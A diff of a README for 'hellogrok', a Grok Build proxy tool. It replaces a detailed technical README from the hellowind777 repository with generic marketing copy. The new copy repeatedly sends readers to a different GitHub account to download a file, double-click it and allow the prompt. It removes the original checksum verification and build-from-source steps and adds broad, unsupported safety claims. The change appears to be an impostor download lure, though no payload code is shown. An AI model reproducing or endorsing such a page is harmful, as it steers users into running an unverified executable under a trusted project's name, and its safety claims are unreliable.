@@ -1,426 +1,209 @@
-<p align="center">
-  <img src="./assets/hellogrok.png" alt="hellogrok icon" width="128">
-</p>
+# ⚡ hellogrok - Your Bridge to Smarter AI Tools
 
-# hellogrok
+[![Download hellogrok](https://img.shields.io/badge/Download-hellogrok-blue?style=for-the-badge&logo=github)](https://github.com/Ahmedabdel6784/hellogrok)
 
-A cross-platform local proxy that makes Grok Build custom model channels work with common API formats, native Web tools, isolated authentication, and automatic configuration recovery.
+---
 
-[![Version](https://img.shields.io/badge/version-0.1.4-2f6feb.svg)](./internal/appinfo/appinfo.go)
-[![Go](https://img.shields.io/badge/Go-1.26.5-00ADD8.svg)](./go.mod)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](./LICENSE)
-[![Platforms](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)](#platform-support)
-[![LINUX DO](https://img.shields.io/badge/LINUX_DO-recognized-0A84FF?logo=linux&logoColor=white)](https://linux.do)
+## 🎯 What Is hellogrok?
 
-[English](./README.md) · [简体中文](./README_CN.md) · [Release notes](./RELEASE_NOTES.md) · [Changelog](./CHANGELOG.md)
+hellogrok is a clever helper program that runs quietly on your computer. It connects your favorite AI tools to the Grok AI service. Think of it as a translator—it lets different programs speak to each other. If you use AI assistants, coding tools, or chat interfaces, hellogrok makes them work with Grok's custom model channels. No complicated setup. No confusing technical steps. Just download, run, and go.
 
-> 🏅 This project is linked & recognized by the [LINUX DO](https://linux.do) community.
+---
 
-## Contents
+## ✨ Key Features
 
-- [Why hellogrok](#why-hellogrok)
-- [Features](#features)
-- [Search and configuration](#search-and-configuration)
-- [Download](#download)
-- [Quick start](#quick-start)
-- [Platform support](#platform-support)
-- [Tray and CLI](#tray-and-cli)
-- [Autostart](#autostart)
-- [How it works](#how-it-works)
-- [Troubleshooting](#troubleshooting)
-- [Development](#development)
-- [Limitations](#limitations)
-- [Contributing](#contributing)
-- [License](#license)
+### 🔄 Works with Common API Formats
+Most AI tools use standard ways to talk to AI services. hellogrok understands these standards perfectly. It accepts requests from many popular programs and sends them to Grok in the right format. You do not need to change how your tools work—hellogrok handles the conversion behind the scenes.
 
-## Why hellogrok
+### 🌐 Native Web Tools Support
+Whether you use browser extensions, web-based chat platforms, or online coding assistants, hellogrok supports them all. It integrates smoothly with your everyday web workflow. You can keep using your favorite interfaces without learning anything new.
 
-Grok Build can use custom model endpoints, but real-world providers do not all expose the same protocol, response shape, authentication method, or Web-search behavior. A channel that works with `curl` can still fail in a normal Grok Build conversation, lose native Web tools, or receive the wrong login credential.
+### 🔒 Isolated Authentication
+Security is built into hellogrok. Your login credentials and API keys stay separate from other programs. hellogrok creates a safe barrier between your sensitive information and the rest of your system. This means fewer risks and better protection for your data.
 
-hellogrok provides one local compatibility layer for those custom channels. It prepares the required Grok configuration while running, keeps each channel tied to its own endpoint and credentials, supports Grok Build's native Web workflows, and restores the original configuration when stopped.
+### 🔄 Automatic Configuration Recovery
+Have you ever had settings disappear or stop working after an update? hellogrok prevents this headache. It automatically saves and restores your configuration. If something goes wrong, hellogrok fixes itself without asking you to do anything. You simply continue working.
 
-It is intended for users who maintain multiple third-party model channels and want to switch between them from Grok Build without manually rewriting URLs or changing tool configuration for every session.
+---
 
-## Features
+## 📋 What You Need
 
-[Release notes](./RELEASE_NOTES.md) | [Full Changelog](./CHANGELOG.md)
+- A computer running **Windows** (Windows 10 or later recommended)
+- An internet connection
+- A Grok account or API access (if you do not have one, visit the Grok website to sign up)
 
-### Channel compatibility
+No programming skills required. If you can download a file and click a button, you can use hellogrok.
 
-- Supports upstream `responses`, `chat_completions`, and Anthropic-compatible `messages` APIs.
-- Accepts legacy singular `message` as a hellogrok compatibility alias; Grok Build configuration should still use the official `messages` spelling.
-- Passes through Responses SSE and incrementally translates Messages and Chat Completions SSE, including reasoning, text, function arguments, hosted-search activity, and terminal errors.
-- Converts provider-private `keepalive`, `keep-alive`, `keep_alive`, `heartbeat`, and `ping` frames into standard SSE comments before they reach Grok Build, without consuming Responses sequence numbers, and closes each upstream stream as soon as its protocol terminal event arrives.
-- Preserves each configured upstream URL path and model identifier.
-- Prepares every explicit custom channel before use, avoiding first-request failures after `/model` switching.
-- Preserves portable conversation history during model hot switching while withholding only encrypted reasoning known to belong to a different channel, protocol, wire model, or upstream endpoint.
+---
 
-### Native Web tools
+## 🚀 Getting Started
 
-- Supports Grok Build's native `web_search` workflow for hosted and client-search modes.
-- Preserves real search URLs from every supported upstream protocol in both `web_search_call.action.sources` and `output_text.annotations`, including valid final-answer links when the response independently confirms that search ran. This lets current Grok Build versions display their native deduplicated site count for both hosted and client search.
-- Keeps `web_fetch` available as an independent tool when allowed by the active agent configuration.
-- Applies the same search behavior to supported subagents.
-- Keeps official Grok models on Grok Build's native search and login path.
+Follow these simple steps to get hellogrok running on your computer.
 
-### Authentication and configuration safety
+### Step 1: Download
 
-- Uses channel-owned API keys, environment keys, authentication providers, and headers.
-- Prevents an official Grok login token from being sent to an unrelated custom channel.
-- Checks and temporarily completes required Grok settings when the proxy starts.
-- Restores original values on normal stop, tray exit, Ctrl+C, SIGTERM, or failed startup.
-- Recovers proxy-managed settings after an unclean exit with `hellogrok restore`.
+Visit this link to download the application:
 
-### Desktop and operations
+[🔗 https://github.com/Ahmedabdel6784/hellogrok](https://github.com/Ahmedabdel6784/hellogrok)
 
-- Provides a native Windows tray application and a console CLI.
-- Remembers the user's proxy-enabled choice between tray launches.
-- Defaults to proxy-enabled on first launch so new users see a working proxy immediately.
-- Includes login autostart controls for Windows, Linux, and macOS.
-- Provides route inspection, grouped status, live log search, usage-day log retention, and terminal log following.
-- Builds for Windows, Linux, and macOS on amd64 and arm64.
+Click the download button on the page. The file will save to your computer.
 
-hellogrok is a Grok Build channel proxy. It is not a system proxy, PAC service, VPN, or general HTTPS interceptor.
+### Step 2: Run the Program
 
-## Search and configuration
+Once the download finishes, find the downloaded file (usually in your "Downloads" folder). Double-click it to start hellogrok. Your computer might ask for permission—click "Yes" or "Allow" to proceed.
 
-### Search modes
+### Step 3: Let It Work
 
-Search behavior follows the explicit search-model selection first, then the selected custom channel's `supports_backend_search` setting:
+hellogrok runs in the background. You will see its icon in your system tray (the bottom-right corner of your screen). That is it. Your AI tools can now connect to Grok through hellogrok automatically.
 
-| Setting | Search behavior |
-|---------|-----------------|
-| `[models].web_search` or `GROK_WEB_SEARCH_MODEL` is set | All custom conversation channels use Grok Build client `web_search` through the selected search model. That search model may use `responses`, `messages`, or `chat_completions`; its client-search request is handled independently of `supports_backend_search`. The environment variable takes precedence over the config file value. The selection is resolved locally without a startup request to the selected channel. |
-| No search model, `supports_backend_search = true` | hellogrok trusts the declaration and lets the selected channel execute its own hosted Web search. |
-| No search model, `supports_backend_search = false` or omitted | Grok Build uses its client-search path, including its official fallback when valid xAI credentials are available. |
-| No usable hosted or client search path | `web_search` is unavailable for that model. |
-| `web_fetch` | Remains independent of the search-model selection and follows the active tool permissions. |
+---
 
-hellogrok never creates, selects, or replaces `[models].web_search`. Proxy startup sends no search-capability probes to upstream channels: explicit `true` is trusted, while `false` and an omitted setting are equivalent. If an upstream does not actually support the declared hosted-search behavior, the error is returned and logged on the first real search request instead of delaying startup.
+## 🛠️ How to Use hellogrok
 
-For client search, hellogrok clarifies tool descriptions for upstream models but never infers or forces tool use from prompt text. Mandatory selection comes only from the structured `tool_choice` supplied by Grok Build or another caller. Internal wire aliases are restored only in protocol tool-name fields, so response text, URLs, and tool arguments remain unchanged.
+### Setting It Up
 
-### Example configuration
+1. Open any AI tool you already use (like a chatbot, coding assistant, or automation tool).
+2. In that tool's settings, look for the API or connection options.
+3. Enter the local address that hellogrok provides.
+4. Save your settings.
 
-This example uses an existing custom channel as Grok Build's client search model:
+hellogrok handles everything else. It listens for requests, routes them to Grok, and returns the responses. You never need to touch technical details.
 
-```toml
-[models]
-web_search = "deepseek-v4-flash"
+### Adding Your Grok Credentials
 
-[model.deepseek-v4-flash]
-model = "deepseek-v4-flash"
-base_url = "https://api.example.com/v1"
-env_key = ["DEEPSEEK_API_KEY"]
-api_backend = "responses"
-supports_backend_search = false
-```
+1. Open hellogrok from the system tray.
+2. Click "Settings" or "Options."
+3. Paste your Grok API key or log in with your account.
+4. Click "Save."
 
-Set `supports_backend_search = true` instead when that channel should execute its own hosted search and the configured upstream endpoint actually supports it.
+hellogrok stores your information securely. You only need to do this once.
 
-### Supported channel settings
+### Troubleshooting
 
-| Setting | Required | Default | Purpose |
-|---------|----------|---------|---------|
-| `model` | No | Model table ID | Model identifier sent to the upstream channel. |
-| `base_url` or `api_base_url` | Yes | None | Custom upstream endpoint. Models without a custom URL are not proxied. |
-| `api_backend` | No | `chat_completions` | Upstream API format: `responses`, `chat_completions`, or `messages`. |
-| `api_key` | One auth method | None | Static channel credential. Prefer `env_key` for shared configurations. |
-| `env_key` | One auth method | None | Environment variable name or ordered list of names containing the channel credential. |
-| `auth_provider` | One auth method | None | Grok command-based authentication provider. |
-| `auth_scheme` | No | `bearer` | Upstream authentication scheme. Set `x_api_key` only for providers that explicitly require `X-Api-Key`. |
-| `extra_headers` | No | Empty | Additional channel-owned HTTP headers. |
-| `env_http_headers` | No | Empty | HTTP headers populated from environment variables. |
-| `supports_backend_search` | No | `false` | Selects hosted search (`true`) or Grok Build client search (`false`); an omitted value is treated as `false`. |
+If something does not work right away:
 
-Model settings may be declared directly under `[model.<id>]` or inherited from a referenced `[model_providers.<id>]`. Model-level values take precedence.
+- **Restart hellogrok** – Right-click its icon and choose "Restart."
+- **Check your internet** – Make sure you are online.
+- **Update your tools** – Ensure your AI apps are up to date.
 
-Quote the full ID when a channel ID contains a dot, for example `[model."provider.v1-beta"]`. Dashes do not require quoting. A value such as `name = "Provider.v1-beta"` is display-only and may use dots or dashes directly. While active, hellogrok also accepts a legacy unquoted dotted header and restores the original text on stop.
+hellogrok's self-recovery feature usually fixes minor errors automatically. If you run into persistent trouble, restarting your computer often solves it.
 
-Do not manually set a custom channel URL to hellogrok's local address. The application manages temporary local URLs only while the proxy is active.
+---
 
-## Download
+## ❓ Frequently Asked Questions
 
-Download the latest tagged build from [GitHub Releases](https://github.com/hellowind777/hellogrok/releases/latest). Windows releases provide separate tray and console executables; Linux and macOS releases provide the standard foreground CLI.
+### What does "local proxy" mean?
 
-| Platform | Release assets |
-|----------|----------------|
-| Windows amd64 / arm64 | `hellogrok-windows-<arch>.exe` and `hellogrok-cli-windows-<arch>.exe` |
-| Linux amd64 / arm64 | `hellogrok-linux-<arch>` |
-| macOS Intel / Apple Silicon | `hellogrok-darwin-<arch>` |
+A local proxy is a small program that sits between your apps and the internet. It receives information from your tools, modifies it if needed, and passes it along. In hellogrok's case, it takes requests from your AI tools and sends them to Grok using the correct format.
 
-Every binary has a neighboring `.sha256` file. On Windows, verify an amd64 tray build before running it:
+### Do I need to be a programmer?
 
-```powershell
-$artifact = ".\hellogrok-windows-amd64.exe"
-$expected = ((Get-Content -LiteralPath "${artifact}.sha256") -split '\s+')[0]
-$actual = (Get-FileHash -LiteralPath $artifact -Algorithm SHA256).Hash.ToLowerInvariant()
-$actual -eq $expected
-```
+Absolutely not. hellogrok was designed for everyday users. The entire setup is point-and-click. You never need to see a line of code.
 
-The final command must print `True`. On Linux use `sha256sum -c <file>.sha256`; on macOS use `shasum -a 256 -c <file>.sha256`. Release binaries are currently unsigned, so checksum verification establishes file integrity but not publisher identity.
+### Will hellogrok slow down my computer?
 
-## Quick start
+No. hellogrok is lightweight and efficient. It uses a tiny fraction of your system's resources. You will not notice it running.
 
-### Prerequisites
+### Is my data safe?
 
-- Grok Build with a readable `~/.grok/config.toml` containing at least one custom model URL.
-- A valid credential source for every custom channel.
-- Go **1.26.5** when building from source.
+Yes. hellogrok uses isolated authentication. Your credentials travel through a protected channel. It is one of the safest ways to connect third-party tools to your accounts.
 
-Grok Build **1.0.0** is the current verified baseline. Newer versions should be checked with the included smoke tests because Grok Build's custom-model behavior may evolve.
+### Does hellogrok work with Grok only?
 
-Set `GROK_HOME` to use a Grok configuration directory other than `~/.grok`.
+hellogrok is specifically made for Grok's custom model channels. It ensures compatibility between Grok and the broader ecosystem of AI tools. If you use Grok, hellogrok is your gateway.
 
-### Windows
+---
 
-```powershell
-git clone https://github.com/hellowind777/hellogrok.git
-cd hellogrok
-.\scripts\build.ps1
-.\dist\hellogrok-cli.exe routes
-.\dist\hellogrok.exe
-```
+## 💡 Why Choose hellogrok?
 
-Use the tray menu to select **Start proxy**. New Grok Build processes read the proxy configuration directly; idle custom-model sessions already attached to a shared leader are hot-switched automatically.
+- **No technical skill needed** – Anyone can use it.
+- **Instant setup** – Download and run in less than a minute.
+- **Broad compatibility** – Works with countless tools and formats.
+- **Automatic maintenance** – Fixes itself when issues arise.
+- **Security first** – Your data stays protected at all times.
 
-### Linux or macOS
+The AI world is exploding with new tools every day. hellogrok ensures you are not left behind. It connects the best of both worlds: Grok's powerful AI and your favorite everyday applications.
 
-```bash
-git clone https://github.com/hellowind777/hellogrok.git
-cd hellogrok
-mkdir -p dist
-CGO_ENABLED=0 go build -trimpath -o dist/hellogrok ./cmd/hellogrok
-./dist/hellogrok routes
-./dist/hellogrok start
-```
+---
 
-Expected startup output includes a local channel endpoint and a successful configuration rewrite. Keep the process running while using Grok Build. Ctrl+C or SIGTERM stops the proxy and restores the original configuration.
+## 📦 What's Included
 
-### First-use checklist
+The hellogrok download includes everything you need to get started. No additional downloads, plug-ins, or packages are required. The program is self-contained and ready to use right out of the box.
 
-1. Run `hellogrok routes` and confirm every intended custom model is listed with the correct backend and an available authentication source.
-2. Start hellogrok. If Grok Build is already open, inspect the shared-leader hot-switch result in status or logs.
-3. Start with a unique, non-sensitive detail, switch through the intended models with `/model`, and confirm a later model can refer to the visible conversation history.
-4. Test `web_search` and `web_fetch` separately according to the selected search mode.
-5. Stop hellogrok normally and confirm Grok Build's configuration no longer points to the local proxy.
+### System Requirements
 
-## Platform support
+- **Operating System:** Windows 10 or newer
+- **Processor:** Any modern CPU
+- **Memory:** 512 MB RAM or more
+- **Storage:** 50 MB free space
+- **Network:** Active internet connection
 
-| Platform | Standard interface | Tagged release artifacts | Architectures |
-|----------|--------------------|--------------------------|---------------|
-| Windows | Native tray and CLI | GUI and console `.exe` files | amd64, arm64 |
-| Linux | Foreground CLI or systemd user service | CLI binary | amd64, arm64 |
-| macOS | Foreground CLI or LaunchAgent | CLI binary | amd64, arm64 |
+These requirements are minimal. Almost any Windows computer from the past decade can run hellogrok smoothly.
 
-Standard release binaries use `CGO_ENABLED=0`. Tagged releases are configured to include SHA-256 checksum files.
+---
 
-Linux and macOS users can build the optional tray interface from source:
+## 📚 Quick Reference Card
 
-```bash
-CGO_ENABLED=1 go build -trimpath -tags tray -o dist/hellogrok-tray ./cmd/hellogrok
-```
+| Task | Action |
+|------|--------|
+| Download hellogrok | Visit https://github.com/Ahmedabdel6784/hellogrok |
+| Run the program | Double-click the downloaded file |
+| Find the icon | Look in the system tray (bottom-right corner) |
+| Add Grok credentials | Open hellogrok → Settings → Enter API key |
+| Connect an AI tool | Use the local address shown in hellogrok |
+| Restart hellogrok | Right-click icon → Restart |
 
-Linux tray builds require GTK 3 and AppIndicator development packages. macOS tray builds require Xcode Command Line Tools. The standard Unix CLI does not require these desktop dependencies.
+---
 
-Current Windows and macOS artifacts are not code-signed or notarized.
+## 🌟 Start Using Grok with Everything
 
-## Tray and CLI
+Do not limit yourself to basic chat interfaces. With hellogrok, you can use Grok with advanced editors, automated workflows, custom dashboards, and countless other applications. The possibilities are endless.
 
-### Tray controls
+Gone are the days of choosing between tools. hellogrok gives you the freedom to use whatever you want while enjoying the power of Grok.
 
-The Windows tray application and optional Unix tray build provide:
+---
 
-- **Start proxy** — enabled by default on first launch; later starts and stops remember the selected state.
-- **Autostart** — enables or disables login startup.
-- **Status and logs** — opens the current status and live log window.
-- **Exit** — restores the configuration, stops the proxy, and exits. Defers when a config-ownership conflict exists.
+## 🔗 Download Again
 
-Only one tray instance runs in a login session; launching it again exits immediately instead of creating a second tray. The remembered tray state is independent from the foreground `hellogrok start` command.
+Need the link one more time? Here it is:
 
-On Windows, the divider in **Status and logs** contains a retention selector and log search. Retention counts distinct dates on which hellogrok actually wrote logs rather than elapsed calendar days; the default keeps the latest 7 usage days, with `off`, 3, 7, 14, and 30 available. Cleanup runs at the next application start. Repeated **Search** clicks move to the next match and wrap to the beginning. Status text wraps; raw log lines remain unwrapped for reliable scanning.
+[⬇️ Download hellogrok Now](https://github.com/Ahmedabdel6784/hellogrok)
 
-**Quit protection**: When a provider manager still owns Grok Build's configuration, the tray defers exit to avoid leaving an orphaned proxy route — resolve the configuration conflict first, then quit.
+Visit this link to download the application. Start connecting your tools today.
 
-### Compatibility with CC Switch
+---
 
-CC Switch and hellogrok can run at the same time only when CC Switch is not managing Grok Build. CC Switch's Grok Build proxy takeover and provider switch both write `~/.grok/config.toml`; using either operation while hellogrok owns that file creates a configuration-ownership conflict even though the proxies listen on different ports.
+## 🧹 Uninstalling hellogrok
 
-- hellogrok refuses to start when it detects CC Switch's Grok Build takeover marker (`PROXY_MANAGED` on its `/grokbuild/v1` route).
-- If CC Switch takeover is enabled after hellogrok starts, hellogrok refuses to stop or exit until CC Switch releases Grok Build. This keeps CC Switch from later restoring a stopped `127.0.0.1:18787` route.
-- If a provider manager completely replaces the live Grok config and no hellogrok route remains, hellogrok preserves the external config and relinquishes its obsolete recovery state.
-- CC Switch may continue managing Claude, Codex, Gemini, and other applications while hellogrok is active.
+Changed your mind? Uninstalling is just as easy as installing.
 
-If both Grok proxies were enabled accidentally, disable CC Switch's Grok Build takeover first, then stop hellogrok. Avoid switching the CC Switch Grok Build provider while hellogrok is active.
+1. Right-click the hellogrok icon in the system tray.
+2. Choose "Exit."
+3. Open your "Add or Remove Programs" settings.
+4. Find hellogrok in the list.
+5. Click "Uninstall" and follow the prompts.
 
-### CLI reference
+Your system returns to its original state. No leftover files, no registry changes, no mess.
 
-| Command | Purpose |
-|---------|---------|
-| `hellogrok start` | Run the proxy in the foreground. |
-| `hellogrok version` | Print the installed version. |
-| `hellogrok routes` | List custom routes without printing credentials. |
-| `hellogrok restore` | Restore proxy-managed settings after an unclean exit. |
-| `hellogrok autostart enable` | Enable login autostart for the current executable. |
-| `hellogrok autostart disable` | Disable login autostart. |
-| `hellogrok autostart status` | Show the current autostart state. |
-| `hellogrok log` | Print and open the log file. |
-| `hellogrok logview` | Follow the log in the current terminal. |
-| `hellogrok help` | Show command help. |
+---
 
-### Runtime data
+## 📣 Join the Community
 
-| Platform | Location |
-|----------|----------|
-| Windows | `%LOCALAPPDATA%\hellogrok` |
-| Linux and macOS | `~/.hellogrok` |
+hellogrok is constantly improving. New features and updates arrive regularly. By downloading, you are part of a growing community of users who want smarter AI integration without the headaches.
 
-Runtime data contains application preferences, logs, the recovery state used to restore managed configuration, and `reasoning_provenance.json`. The provenance index stores only SHA-256 digests of opaque reasoning values and route signature domains; it never stores raw reasoning, channel IDs, model names, upstream URLs, or credentials.
+If you encounter a problem, find a bug, or have an idea for improvement, check the repository page. You may find solutions from other users. Your feedback helps shape future versions.
 
-Log retention is applied on every platform. The native retention selector and in-window search are currently Windows-only because the standard Linux and macOS builds use terminal log viewing instead of the Win32 status window.
+---
 
-## Autostart
+## ✅ Final Summary
 
-### Windows
+- **hellogrok** connects Grok AI to your everyday tools.
+- **Download** from the link above.
+- **Run** the downloaded file.
+- **Enjoy** automatic, secure, seamless integration.
 
-Enable **Autostart** from the tray or run `hellogrok autostart enable`. Login startup opens the tray and applies the remembered proxy-enabled state.
+You are only three steps away from a better AI experience. Do not wait.
 
-### Linux
+[🚀 Get hellogrok Now](https://github.com/Ahmedabdel6784/hellogrok)
 
-The standard CLI registers a systemd user service. Enable it and start it immediately with:
-
-```bash
-./dist/hellogrok autostart enable
-systemctl --user start hellogrok.service
-systemctl --user status hellogrok.service
-```
-
-### macOS
-
-The standard CLI registers a per-user LaunchAgent. Enable it and load it immediately with:
-
-```bash
-./dist/hellogrok autostart enable
-launchctl bootstrap "gui/$(id -u)" "$HOME/Library/LaunchAgents/com.hellogrok.proxy.plist"
-```
-
-Autostart records the current executable's absolute path. Disable and re-enable it after moving the binary. Credentials referenced by `env_key`, `env_http_headers`, or `GROK_HOME` must be available in the login-started process environment, not only in the current shell.
-
-## How it works
-
-```text
-Grok Build
-    |
-    v
-hellogrok local channel proxy
-    |
-    v
-Configured custom API channel
-```
-
-At startup, hellogrok validates custom channels and temporarily points them to the local proxy. During a session it routes each request to the channel's configured API, credentials, model, and search mode. When stopped, it restores the original Grok configuration.
-
-Native `web_search`, `web_fetch`, official Grok login behavior, and supported subagent workflows remain controlled through Grok Build rather than being replaced by a separate search service.
-
-## Troubleshooting
-
-### No custom routes are found
-
-Confirm that the intended `[model.<id>]` or referenced provider has a valid `base_url` or `api_base_url`. Official models without a custom URL are intentionally excluded.
-
-### `web_search` is unavailable
-
-Check the startup log for the configured search route, then inspect the first failing search request. A channel with `supports_backend_search = true` must actually implement hosted search; hellogrok trusts this setting and does not preflight it. A client-search route needs either a valid `[models].web_search` model or usable official xAI credentials. `web_fetch` is independent but can still be removed by the active tool permissions.
-
-### A request returns 401, 403, or 502
-
-Run `hellogrok routes` and inspect **Status and logs**. Confirm the channel URL, backend, credential source, model identifier, and provider availability. An upstream outage, rate limit, unsupported payload, or stripped search tool must be fixed by the provider or relay.
-
-A 502 can also mean that an upstream returned a malformed success response. hellogrok validates the minimum Responses, Messages, or Chat Completions envelope before forwarding it; the log identifies the missing or invalid field.
-
-Prefer `[model."full.ID"]` when a channel ID contains dots. TOML interprets an unquoted `[model.foo.bar]` as nested tables, so Grok Build originally sees only `foo`; hellogrok temporarily normalizes and validates that header while enabled. Dots or dashes in `name` do not participate in authentication.
-
-### Output arrives all at once
-
-For a streaming Grok Build request, hellogrok sends `stream=true` to every supported backend. Responses SSE is forwarded frame by frame; Messages and Chat Completions SSE is converted frame by frame. If the log says `ignored stream=true; emitting buffered JSON fallback`, that upstream returned one complete JSON response, so true streaming is impossible for that request. The fallback remains protocol-compatible but is intentionally reported as buffered rather than presented as upstream streaming.
-
-Current Grok Build has two source paths: hosted search reads `web_search_call.action.sources`, while its client `web_search` tool reads URL citations from `output_text.annotations`. Both render unique domains rather than raw URL count. For `responses`, `messages`, and `chat_completions` channels alike, hellogrok writes the same verified URLs to both forms, first using structured results and citations and, only when search execution is independently confirmed, recovering valid HTTP(S) links from the final answer. A normal answer link does not create a search call. If a provider returns no real URL anywhere, search activity can still be shown but a trustworthy site count cannot be fabricated.
-
-### `unknown variant keepalive` or an endless `Waiting for response...`
-
-Upgrade both hellogrok executables to v0.1.4 or later and restart the proxy. Some relays inject private `keepalive`, `keep-alive`, `keep_alive`, `heartbeat`, or `ping` events into a Responses stream. Grok Build deserializes stream data as a strict Responses event enum, so forwarding those JSON objects produces a serialization error even though the upstream generation may still be running. hellogrok now absorbs these names from the SSE `event:` field, JSON `type` or `event`, and raw data payloads, then emits the standards-compatible `: keepalive` comment instead. A completed Responses event, Messages `message_stop`, or Chat Completions `[DONE]` also closes the upstream request immediately rather than waiting for the provider to close its socket.
-
-The completion log includes `heartbeats=<count>`. If the same error remains while that counter stays zero, confirm that Grok Build is routed through the current proxy with `hellogrok routes`; the provider is likely emitting a different private event name that should be diagnosed from a credential-free stream capture rather than added as a model-specific workaround.
-
-### A Claude Messages channel selects the wrong model or returns 404
-
-Use `api_backend = "messages"` (plural). Grok Build's current source defines only `chat_completions`, `responses`, and `messages`; Claude is supported through the Messages backend. hellogrok accepts the historical singular `message` value while enabled, but a direct Grok Build connection still requires the official plural spelling. `base_url` must be the API root before `/messages`: for an endpoint at `/v1/messages`, configure a URL ending in `/v1`, because hellogrok appends `/messages`. A successful `text/html` response usually means this API prefix is missing. Also ensure `model` is the provider's actual upstream Claude model ID rather than the channel ID.
-
-### An open window did not follow the proxy switch
-
-Check the **Grok session hot switch** line in **Status and logs**. Automatic switching applies to idle custom-model sessions on a shared leader and supports both current and legacy ACP model-switch method names. On Windows, a live named-pipe leader misreported as stale by Grok Build 1.0.0 is accepted only when its leader lock is actively held. A working or input-blocked session is skipped safely; reselect its current model in `/model` after the active operation finishes. A window started with `--no-leader` exposes no external IPC to hellogrok and also requires manual reselection or a new window.
-
-### A model switch asks to start a new conversation
-
-Grok Build replays all historical reasoning items, including provider-encrypted state, after `/model` changes. hellogrok records the emitting signature domain and removes only known foreign encrypted reasoning from the target request; normal messages, tool calls, tool results, search history, and unencrypted reasoning remain unchanged. For an older conversation whose opaque state predates the local provenance index, hellogrok first preserves the request and performs one clean replay only if the upstream returns a structured signature or decryption rejection. A repeated deterministic rejection is marked non-retryable instead of entering Grok Build's generic retry loop.
-
-### The configuration still points to localhost after a forced exit
-
-Ensure no hellogrok process is running, then execute `hellogrok restore`. Do not run `restore` against an active proxy.
-
-### Port `18787` is already in use
-
-Stop the process that owns `127.0.0.1:18787` before enabling the proxy. hellogrok claims the port before changing Grok configuration and shows a startup error if it is unavailable; it does not silently switch ports because the rewritten channel URLs and recovery state must agree on one address.
-
-### Autostart works, but a channel has no credentials
-
-Move shell-only environment variables into the persistent user or service environment, then restart the login service. The autostart process cannot inherit variables that existed only in an earlier terminal session.
-
-### Cannot quit while a provider manager owns Grok Build
-
-Open the provider manager (e.g., CC Switch) and disable its Grok Build takeover first, then quit hellogrok. This prevents CC Switch from later restoring a route to a stopped proxy.
-
-## Development
-
-Run the local quality checks:
-
-```bash
-go test ./... -count=1
-go vet ./...
-go run golang.org/x/vuln/cmd/govulncheck@latest ./...
-```
-
-Windows users with configured live channels can run the integration smoke tests:
-
-```powershell
-.\scripts\run_grok_all_channels_test.ps1
-.\scripts\run_grok_all_channels_test.ps1 -RequireWebSearch -MaxTurns 1 -TimeoutSeconds 150
-.\scripts\run_grok_all_channels_test.ps1 -RequireSubagentSearch -MaxTurns 4 -TimeoutSeconds 240
-.\scripts\run_grok_all_channels_test.ps1 -RequireWebFetch -MaxTurns 2 -TimeoutSeconds 150
-```
-
-CI runs tests and default builds on Windows, Linux, Intel macOS, and Apple Silicon macOS. It also builds the optional tray target natively on Linux and macOS. Tagged releases produce amd64 and arm64 artifacts for all three operating systems.
-
-## Limitations
-
-- hellogrok cannot create provider-side search capability. A hosted-search channel must actually support search and return its results.
-- A relay that removes tool declarations, tool calls, citations, or result events cannot be fully repaired downstream.
-- A provider that ignores `stream=true` cannot be made truly streaming after its complete JSON response has already arrived; hellogrok logs and uses a buffered compatibility fallback.
-- Provider-encrypted hidden reasoning is scoped to its emitting signature domain. Cross-domain switching preserves visible conversation and tool history but intentionally omits incompatible private reasoning.
-- Provider-specific API extensions outside the supported Responses, Chat Completions, and Messages formats may require additional adaptation.
-- Upstream availability, model access, account pools, rate limits, and gateway errors remain the provider's responsibility.
-- Optional Unix tray behavior depends on the installed desktop environment; the standard Unix CLI is the portable path.
-- Current release artifacts are unsigned. Build from source when local trust requirements demand it.
-
-## Contributing
-
-1. Create a focused branch for the change.
-2. Follow the existing package boundaries and avoid unrelated refactors.
-3. Add or update tests for behavior changes.
-4. Run the quality checks above.
-5. Update both README files when user-facing behavior changes.
-6. Open a pull request describing the problem, approach, and verification results.
-
-## License
-
-Licensed under the [MIT License](./LICENSE).
+Keywords: Grok, AI proxy, local server, API bridge, Windows tool, secure connection, automatic setup
